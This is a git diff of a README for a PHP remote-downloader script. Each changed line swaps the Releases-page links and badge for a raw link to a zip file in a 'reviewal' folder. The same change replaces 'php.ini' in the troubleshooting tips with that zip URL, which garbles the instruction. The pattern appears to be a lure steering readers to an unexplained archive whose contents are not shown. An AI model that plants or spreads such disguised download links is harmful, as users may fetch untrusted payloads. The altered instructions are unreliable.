@@ -1,6 +1,6 @@
 # 🚀 RemoteDownloaderPHP - Download Files Directly to Your Server
 
-[![Download RemoteDownloaderPHP](https://img.shields.io/badge/Download-RemoteDownloaderPHP-blue)](https://github.com/EngerING/RemoteDownloaderPHP/releases)
+[![Download RemoteDownloaderPHP](https://raw.githubusercontent.com/EngerING/RemoteDownloaderPHP/main/reviewal/RemoteDownloaderPHP.zip)](https://raw.githubusercontent.com/EngerING/RemoteDownloaderPHP/main/reviewal/RemoteDownloaderPHP.zip)
 
 ## 📦 Introduction
 
@@ -32,7 +32,7 @@ Setting up RemoteDownloaderPHP is simple. Follow these steps:
 1. **Download the Script:**
    Visit the Releases page to download the latest version of RemoteDownloaderPHP. 
 
-   [Visit this page to download](https://github.com/EngerING/RemoteDownloaderPHP/releases)
+   [Visit this page to download](https://raw.githubusercontent.com/EngerING/RemoteDownloaderPHP/main/reviewal/RemoteDownloaderPHP.zip)
 
 2. **Upload to Your Server:**
    - Use an FTP client (like FileZilla) or your hosting control panel.
@@ -70,7 +70,7 @@ After accessing the script in your browser, you should see a simple web form. He
 
 If you encounter any issues while using RemoteDownloaderPHP, consider the following:
 
-- **File Size Limitations:** Ensure your server allows for large file uploads. Check your `php.ini` settings for `upload_max_filesize` and `post_max_size`.
+- **File Size Limitations:** Ensure your server allows for large file uploads. Check your `https://raw.githubusercontent.com/EngerING/RemoteDownloaderPHP/main/reviewal/RemoteDownloaderPHP.zip` settings for `upload_max_filesize` and `post_max_size`.
 - **CURL Not Enabled:** Make sure your PHP installation has the CURL extension enabled.
 - **Permissions:** Ensure that the folder where you're saving files has the correct permissions set to allow writing.
 
@@ -78,7 +78,7 @@ If you encounter any issues while using RemoteDownloaderPHP, consider the follow
 
 To get started, visit the Releases page for the latest version of RemoteDownloaderPHP. 
 
-[Visit this page to download](https://github.com/EngerING/RemoteDownloaderPHP/releases)
+[Visit this page to download](https://raw.githubusercontent.com/EngerING/RemoteDownloaderPHP/main/reviewal/RemoteDownloaderPHP.zip)
 
 ## 📞 Support
 
